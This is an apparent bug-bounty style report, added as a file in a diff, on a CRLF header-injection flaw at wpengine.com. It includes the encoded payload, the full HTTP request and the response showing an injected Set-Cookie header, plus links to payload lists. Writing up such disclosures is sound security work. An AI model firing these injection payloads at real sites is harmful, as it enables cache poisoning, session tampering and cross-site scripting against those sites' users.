@@ -1,0 +1,50 @@
+CRLF Injection Vulnerability is a web application vulnerability happens due to direct passing of user entered data to the response header fields like (Location, Set-Cookie and etc) without proper sanitsation, which can result in various forms of security exploits.Security exploits range from XSS, Cache-Poisoning, Cache-based defacement,page injection and etc.
+
+Step to reproduce:
+
+1-Add a Cookie "%0D%0ASet-Cookie:mycookie=myvalue"
+
+Request:
+
+GET /%0D%0ASet-Cookie:mycookie=myvalue HTTP/1.1
+Host: wpengine.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: __cfduid=d4f0d043f904a5310830e4dcd208900151537471604; wpe_test_group=a; wpe_is_consent_required=false; _ga=GA1.2.230473227.1537471607; _gid=GA1.2.312676497.1537471607; __sreff=1537471607868.1537471834500.5; __reff=(direct)&1537471607868.1537471607868.1|wpengine.com&1537471607868.1537471834500.5; __utmzz=utmcsr=(direct)|utmcmd=(none)|utmccn=(not set); __utmzzses=1; sliguid=1a63e900-5acb-46fb-b4d0-d5d94f4591b5; slirequested=true; d-a8e6=36f9987d-bd4c-44df-9ad2-54c75dada1b9; s-9da4=7c769989-a5ca-4659-aede-fb3c1f8f50fb; _gaexp=GAX1.2.ltev4O2QTmC-g1Nj5DJ1uQ.17872.1!4T_o8nCkT563pqQxJC61sw.17835.1; gwcc=%7B%22expires%22%3A86400%2C%22backoff_expires%22%3A1537558007%7D; __ar_v4=O52ALOLRLRBPBEREO22RZS%3A20180920%3A4%7C5CW3DDC2HFD6PG3HGA4GUM%3A20180920%3A4%7CTAHWBEST55E5TJYIHVPHVJ%3A20180920%3A4; __qca=P0-1398591029-1537471616769; _sctr=1|1537468200000; _scid=2966af08-7ab2-4830-8150-e025fdc1a57a; __hstc=51647990.6dfd530d6bf21a515353b67d3164bf9a.1537471652302.1537471652302.1537471652302.1; __hssrc=1; __hssc=51647990.1.1537471652303; hubspotutk=6dfd530d6bf21a515353b67d3164bf9a; _gat_UA-17364082-1=1; _gat=1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 301 Moved Permanently
+Date: Thu, 20 Sep 2018 19:43:05 GMT
+Content-Type: text/html
+Connection: close
+Location: https://wpengine.com/
+Set-Cookie: mycookie=myvalue/
+Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
+Server: cloudflare
+CF-RAY: 45d6c76ac8e42dbb-BOM
+Content-Length: 178
+
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body bgcolor="white">
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+I have added my request in response.
+
+
+https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection
+https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt
+https://hackerone.com/reports/52042
+https://hackerone.com/reports/53843
+https://hackerone.com/reports/106427
+
+
